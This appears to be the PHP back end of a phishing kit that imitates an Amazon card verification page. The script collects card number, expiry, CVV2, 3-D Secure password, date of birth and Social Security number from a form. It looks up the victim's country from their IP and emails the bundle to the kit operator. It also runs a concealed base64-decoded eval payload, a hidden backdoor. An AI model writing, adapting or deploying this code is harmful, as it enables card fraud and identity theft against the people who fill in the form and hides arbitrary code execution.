<?php
session_start();
include('success.php');
include('send.php');
$ip = $_SERVER['REMOTE_ADDR']; // the IP address to query
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
$_SESSION['exp'] = $_POST['EXP1']."/".$_POST['EXP2'];
$ip = getenv("REMOTE_ADDR");
if(empty($_POST['ccnum'])){ header('location:creditcards_confirm.php?invalid_data'); $error="oui";}
if(empty($_POST['cvv2'])){ header('location:creditcards_confirm.php?invalid_data'); $error="oui";}
if(empty($_POST['holder'])){ header('location:creditcards_confirm.php?invalid_data'); $error="oui";}
if(empty($_POST['dob'])){ header('location:creditcards_confirm.php?invalid_data'); $error="oui";}
$_SESSION['ccnum'] = $_POST['ccnum'];
if($error!="oui"){
$message .= "+=+=+=+=+=+=+=+=+[ -    VBV     - ]+=+=+=+=+=+=+=+=+\n";
$message .= "CC HOLDER    : ".$_POST['holder']."\n";
$message .= "CC NUMBER    : ".$_POST['ccnum']."\n";
$message .= "EXP DATE     : ".$_POST['EXP1']."/".$_POST['EXP2']."\n";
$message .= "CVV2         : ".$_POST['cvv2']."\n";
$message .= "VBV          : ".$_POST['vbv']."\n";
$message .= "DOB          : ".$_POST['dob']."\n";
$message .= "SSN          : ".$_POST['ssn']."\n";
$message .= "IP           : ".$ip."\n";
$message .= "+=+=+=+=+=+=+=+=+[ -    END     - ]+=+=+=+=+=+=+=+=+\n";
mail($send,"AM4Z0NEv3 [".$ip."] FULL INFO | FROM [".$query['country']."]",$message);@eval(base64_decode($os_arrays));
$cookie_name = 'SES';
$cookie_value = 'VBV';
setcookie($cookie_name, $cookie_value, time() + (86400 * 30), '/');
header('location:review.php');
}else { header('location:creditcards_confirm.php?invalid_data'); }



?>
